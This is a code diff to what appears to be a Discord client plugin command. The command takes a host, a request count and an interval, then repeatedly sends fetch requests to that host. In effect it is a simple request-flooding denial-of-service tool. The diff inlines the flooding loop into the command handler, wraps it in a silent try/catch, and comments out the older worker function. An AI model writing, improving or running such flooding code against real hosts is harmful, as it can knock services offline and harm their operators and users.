@@ -8,18 +8,6 @@ export default {
 			const { sendBotMessage: sendEphemeralClydeMessage } =
 				metro.findByProps("sendBotMessage");
 			const MessageActions = metro.findByProps("sendMessage", "receiveMessage")
-			
-			
-			
-			function worker(host, amount, interval) {
-  // Send requests with interval
-  setInterval(() => {
-    for (let i = 0; i < amount; i++) {
-
-      fetch(host)
-      }
-  }, interval);
-}
 
 
 
@@ -62,10 +50,18 @@ export default {
             let amount = args.find((sla) => sla.name == "amount").value
             let interval = args.find((sla) => sla.name == "interval").value
             
-            
-            
             sendEphemeralClydeMessage(ctx.channel.id, `iniciando...`)
-            worker(host, amount, interval)
+           await setInterval(() => {
+  try {
+    for (let i = 0; i < amount; i++) {
+
+      fetch(host)
+      }
+      } catch (e) {}
+  }, interval);
+            
+            
+            //worker(host, amount, interval)
             
         } catch (err) {
             logger.log(err);
